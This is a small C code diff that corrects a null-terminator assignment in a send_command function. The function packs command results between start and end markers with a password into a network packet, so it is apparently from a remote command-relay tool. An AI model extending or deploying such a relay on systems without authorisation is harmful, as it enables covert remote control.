@@ -278,7 +278,7 @@ int send_command(char * command, const struct ip_struct * ip, const int dest_por
 	{
 		printf("Getting\n");
 
-		cmd_results[strlen(cmd_results)-1] = "\0";
+		cmd_results[strlen(cmd_results)-1] = '\0';
 		//Format packet payload
 		sprintf(packet, "%s %d %s%s%s", PASSWORD, CLIENT_MODE, CMD_START, cmd_results, CMD_END);
 		printf("Packet: %s\n", packet);
